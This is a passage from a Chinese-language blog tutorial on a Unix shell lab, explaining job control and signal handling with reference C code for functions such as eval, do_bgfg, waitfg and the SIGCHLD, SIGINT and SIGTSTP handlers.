class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $begin handout */</span></span><br><span class="line">    <span class="keyword">char</span> *argv[MAXARGS]; <span class="comment">/* argv for execve() */</span></span><br><span class="line">    <span class="keyword">int</span> bg;              <span class="comment">/* should the job run in bg or fg? */</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid;           <span class="comment">/* process id */</span></span><br><span class="line">    <span class="keyword">sigset_t</span> mask;       <span class="comment">/* signal mask */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse command line */</span></span><br><span class="line">    bg = parseline(cmdline, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span>;   <span class="comment">/* ignore empty lines */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a little tricky. Block SIGCHLD, SIGINT, and SIGTSTP</span></span><br><span class="line"><span class="comment"> * signals until we can add the job to the job list. This</span></span><br><span class="line"><span class="comment"> * eliminates some nasty races between adding a job to the job</span></span><br><span class="line"><span class="comment"> * list and the arrival of SIGCHLD, SIGINT, and SIGTSTP signals.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sigemptyset(&amp;mask) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigemptyset error"</span>);</span><br><span class="line"><span class="keyword">if</span> (sigaddset(&amp;mask, SIGCHLD))</span><br><span class="line">    unix_error(<span class="string">"sigaddset error"</span>);</span><br><span class="line"><span class="keyword">if</span> (sigaddset(&amp;mask, SIGINT))</span><br><span class="line">    unix_error(<span class="string">"sigaddset error"</span>);</span><br><span class="line"><span class="keyword">if</span> (sigaddset(&amp;mask, SIGTSTP))</span><br><span class="line">    unix_error(<span class="string">"sigaddset error"</span>);</span><br><span class="line"><span class="keyword">if</span> (sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"sigprocmask error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create a child process */</span></span><br><span class="line"><span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"fork error"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Child  process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* Child unblocks signals */</span></span><br><span class="line">    sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each new job must get a new process group ID</span></span><br><span class="line"><span class="comment">       so that the kernel doesn't send ctrl-c and ctrl-z</span></span><br><span class="line"><span class="comment">       signals to all of the shell's jobs */</span></span><br><span class="line">    <span class="keyword">if</span> (setpgid(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">unix_error(<span class="string">"setpgid error"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now load and run the program in the new job */</span></span><br><span class="line">    <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s: Command not found\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Parent process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Parent adds the job, and then unblocks signals so that</span></span><br><span class="line"><span class="comment">   the signals handlers can run again */</span></span><br><span class="line">addjob(jobs, pid, (bg == <span class="number">1</span> ? BG : FG), cmdline);</span><br><span class="line">sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!bg)</span><br><span class="line">    waitfg(pid);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $end handout */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是我们直接给出的代码，但是在CMU的实验中也应该可以使用。</span></span><br></pre></td></tr></table></figure><h2 id="build-cmd-函数"><a href="#build-cmd-函数" class="headerlink" title="build_cmd 函数"></a>build_cmd 函数</h2><h3 id="函数功能-1"><a href="#函数功能-1" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    如果使用者已经输入了我们在内部已经定义好的函数的话，那么我们就让这个shell直接执行这个函数。</p><h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>​    参数是**argv，如果经常写C程序的话，这个东西是编译指令的一部分，也就是命令行参数，我们从命令行中输入的东西就通过这个参数传入了程序中。</p><h3 id="处理流程-1"><a href="#处理流程-1" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    整个的处理流程十分简单，相当于是我们对我们输入的命令进行比较，达到一个switch语句的功能。在这个过程中，我们根据框架发现，我们事实上只需要对四种命令进行判断，从而进入三个不同的函数。然后由于这个函数是一个int类型的返回值，所以我们要根据我们执行的函数返回不同的数据。</p><h3 id="要点分析-1"><a href="#要点分析-1" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    1.在quit函数中，我们要保证所有当前进程结束之后才能结束整个shell的工作。</p><p>​    2.我们输入bg、fg命令的时候，我们执行的是相同的函数do_bgfg()，所以这个时候返回值是相同的。</p><h3 id="参考代码-1"><a href="#参考代码-1" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>))   <span class="comment">//退出命令</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; MAXJOBS;i ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(jobs[i].pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(jobs[i].pid, SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>))    <span class="comment">//job order</span></span><br><span class="line">    &#123;</span><br><span class="line">        listjobs(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        do_bgfg(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="do-fgbg-函数"><a href="#do-fgbg-函数" class="headerlink" title="do_fgbg 函数"></a>do_fgbg 函数</h2><h3 id="函数功能-2"><a href="#函数功能-2" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    当我们输入的命令是对前台或者后台进行操作的时候，执行该函数。具体的函数功能在处理流程中分析。</p><h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>​    char **argv参数和在built_cmd函数一样，都是在从命令行中读取的。</p><h3 id="处理流程-2"><a href="#处理流程-2" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    在我们输入的命令为空的时候，我们输出缺少参数，然后结束函数。而在我们输入的命令不为空的时候，判断第一个参数是不是数字。从我们输入的第一部分命令中提取出我们想要的pid，然后看我们的jobs中有没有这个pid对应的进程，如果没有那么就返回没有对应的进程，否则我们就令jobp为我们得到的对应的工作的pid。然后看下一个参数，我们将这部分命令参数提取出来，就得到了我们想要的jid，然后看我们的jobs中有没有这个jid对应的工作，如果没有那么我们就返回没有对应的工作，否则那么根据以上的两段代码，我们就可以得到我们需要使用的pid和jid。紧接着我们判断我们输入的是bg还是fg，如果是bg那么就向该进程所在的进程组发送SIGCONT信号激活改进程组，并将作业的状态改为后台作业。然后将修改的进程的相关信息进行输出。如果是fg，那么激活这个进程后，将作业的状态改为前台作业，并使用waitfg()函数等待这个进程停止或终止。</p><h3 id="要点分析-2"><a href="#要点分析-2" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    首先，我们在改变进程的状态的时候，要根据我们实验框架中的标准进行更改，也就是说，我们要改的是那个state的参数，我们根据得到的是bg还是fg进行对应的更改。</p><p>​    其次，我们激活进程组的方法是利用kill函数，这个方法可以根据之前的信号的发送部分的预习进行进一步的学习。</p><p>​    最后，我们在这个函数中使用的waitfg函数，是为了等待前台进程结束后进行处理，所以我们之后要做的就是如何判断前台进程结束。</p><h3 id="参考代码-2"><a href="#参考代码-2" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* $begin handout */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">jobp</span>=<span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ignore command if no argument */</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Parse the required PID or %JID arg */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (!(jobp = getjobpid(jobs, pid))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, pid);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> jid = atoi(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (!(jobp = getjobjid(jobs, jid))) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bg command */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (kill(-(jobp-&gt;pid), SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"kill (bg) error"</span>);</span><br><span class="line">jobp-&gt;state = BG;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, jobp-&gt;jid, jobp-&gt;pid, jobp-&gt;cmdline);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fg command */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (kill(-(jobp-&gt;pid), SIGCONT) &lt; <span class="number">0</span>)</span><br><span class="line">    unix_error(<span class="string">"kill (fg) error"</span>);</span><br><span class="line">jobp-&gt;state = FG;</span><br><span class="line">waitfg(jobp-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"do_bgfg: Internal error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* $end handout */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="waitfg-函数"><a href="#waitfg-函数" class="headerlink" title="waitfg 函数"></a>waitfg 函数</h2><h3 id="函数功能-3"><a href="#函数功能-3" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    挂起主Shell的进程，等待前台进程截止。</p><h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>​    pid_t pid，这个参数指的是传入这个函数中的正在运行的前台进程的pid。</p><h3 id="处理流程-3"><a href="#处理流程-3" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    直到我们输入的pid不再是前端进程的pid，我们一直使这个进程保持挂起状态，以免出现险象或者冲突导致的信号消失。</p><h3 id="要点分析-3"><a href="#要点分析-3" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    首先我们最重要的是，我们一开始先要置空信号，然后在根据我们的pid的行动过程去进行信号的挂起，在这个时候我们要持续的对信号进行挂起，也就用到了sigsuspend函数。</p><h3 id="参考代码-3"><a href="#参考代码-3" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">sigset_t</span> mask;</span><br><span class="line">sigemptyset(&amp;mask);<span class="comment">//初始化状态</span></span><br><span class="line"><span class="keyword">while</span>(pid == fgpid(jobs))&#123;<span class="comment">//判断当前进程是不是我们输入的进程</span></span><br><span class="line">sigsuspend(&amp;mask);<span class="comment">//将进程进行挂起</span></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span>;<span class="comment">//结束函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sigchld-handler函数"><a href="#sigchld-handler函数" class="headerlink" title="sigchld_handler函数"></a>sigchld_handler函数</h2><h3 id="函数功能-4"><a href="#函数功能-4" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    当一个进程称为僵死进程的时候，内核发送一个SIGCHLD信号给shell，或者是由于收到了SIGINT或者SIGTSTP信号而终止。处理函数回收所有可见的僵死进程，但是不会等待当前正在进行的进程的子进程终止才执行回收。</p><h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>​    int sig 这个参数没用，只起到占位的作用。</p><h3 id="处理流程-4"><a href="#处理流程-4" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    处理之前应当阻塞所有信号。循环使用waitpid函数获取发送SIGCHLD信号的进程号，waitpid的第一个参数置为-1表示等待的对象时该进程的所有子进程，将查询的状态放置在status中以供后续解析，参数<code>WNOHANG | WUNTRACED</code>表示查询得到僵尸（停止）进程的pid，如果无僵尸（停止）进程则直接返回0，不阻塞运行以等待。只要返回的数值大于0说明就有至少一个的僵尸（停止）进程等待处理，此时的返回值即为僵尸（停止）进程的pid。循环体内为处理僵尸（停止）进程部分。由于可能需要在作业数组中删除作业，所以处理前应当先阻塞所有信号的接收。接着判断该信号是由于停止还是终止引起的，如果是停止，则只需要将作业的状态改为ST，如果是终止，则从作业数组中删去该作业。最后恢复阻塞状态。整个errno作为一个状态的参数变量存储起来，而在这个过程中，我们无论做出什么样的处理，我们最后都应该将整个进程恢复为原来的状态，也就是在errno中存储的状态。这个类似的代码内容和解释在我们的课本上都有，所以我们可以进行查询。</p><h3 id="要点分析-4"><a href="#要点分析-4" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    首先，最重要的就是waitpid这个函数了，在这个函数中status表示中止进程或者停止进程的原因，WNOHANG | WUNTRACED表示立即返回，如果等待集合中没有进程被中止或停止返回0，否则返回进程的pid。而许多我们的判断条件，都依靠这个函数的不同参数的组合。</p><p>​    其次，WIFSTOPPED(status):表示如果进程是因为停止的信号而停止，那么返回true. WIFSIGNALED(status):表示进程如果是因为未捕获的信号而中止，返回true。WIFEXITED(status):表示进程通过调用exit()或者return正常结束，则返回true。</p><p>​    最后，最重要的还是更改信号状态并恢复的过程并注意，最后要清楚缓冲区，否则无法完全结束进程。</p><h3 id="参考代码-4"><a href="#参考代码-4" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;<span class="comment">//记录原来状态</span></span><br><span class="line"><span class="keyword">pid_t</span> pid;<span class="comment">//当前pid</span></span><br><span class="line"><span class="keyword">int</span> status;<span class="comment">//waitpid的status参数</span></span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;<span class="comment">//存储状态</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">tmpjob</span>;</span></span><br><span class="line">sigfillset(&amp;mask);<span class="comment">//首先先初始化</span></span><br><span class="line"><span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG|WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">        tmpjob = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">            tmpjob-&gt;state = ST;<span class="comment">//如果是停止的信号，那么执行以下的操作</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, tmpjob-&gt;jid, tmpjob-&gt;pid, WSTOPSIG(status));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(WIFSIGNALED(status))&#123;<span class="comment">//如果是未捕获，执行以下操作</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, tmpjob-&gt;jid, tmpjob-&gt;pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    errno = olderrno;<span class="comment">//恢复状态</span></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="sigint-handler函数（sigtstp-handler）"><a href="#sigint-handler函数（sigtstp-handler）" class="headerlink" title="sigint_handler函数（sigtstp_handler）"></a>sigint_handler函数（sigtstp_handler）</h2><h3 id="函数功能-5"><a href="#函数功能-5" class="headerlink" title="函数功能"></a>函数功能</h3><p>​    这个函数用于处理SIGINT信号，对应的是用户按下ctrl+c的事件，此时应当强行终止前台运行的任何进程。当然我们的sigtstphandler函数和它的功能类似，所以也就不一一展开讲了。</p><h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>​    同sigchld_handler函数。</p><h3 id="处理流程-5"><a href="#处理流程-5" class="headerlink" title="处理流程"></a>处理流程</h3><p>​    按照惯例，保存一下errno。由于要获取一下前台程序的pid，应当阻塞一下所有信号，待获取之后恢复原阻塞状态即可。获取前台程序的pid就使用fgpid()函数。如果前台没有程序在运行，那么返回的是0，否则返回的是一个大于0的pid。最后我们让shell发送一个SIGINT信号给这个进程就行了。注意，我们使用ctrl+c终止的应当是前台进程组，即前台进程以及它所有的子进程，所以kill()函数的第一个参数应当传递前台进程的进程组号，默认是进程号的相反数。kill(0 - fg_pid, SIGINT);最后恢复errno即可。    </p><h3 id="要点分析-5"><a href="#要点分析-5" class="headerlink" title="要点分析"></a>要点分析</h3><p>​    最重要的就是处理信号的过程，还是要巩固书上的内容。</p><h3 id="参考代码-5"><a href="#参考代码-5" class="headerlink" title="参考代码"></a>参考代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;</span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line"><span class="keyword">pid_t</span> fg_pid;</span><br><span class="line"></span><br><span class="line">sigfillset(&amp;mask);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">fg_pid = fgpid(jobs);</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(fg_pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(<span class="number">0</span> - fg_pid, SIGINT);</span><br><span class="line">&#125;</span><br><span class="line">errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> olderrno = errno;</span><br><span class="line"><span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line"><span class="keyword">pid_t</span> fg_pid;</span><br><span class="line"></span><br><span class="line">sigfillset(&amp;mask);</span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">fg_pid = fgpid(jobs);</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(fg_pid != <span class="number">0</span>)&#123;</span><br><span class="line">kill(<span class="number">0</span> - fg_pid, SIGTSTP);</span><br><span class="line">&#125;</span><br><span class="line">errno = olderrno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 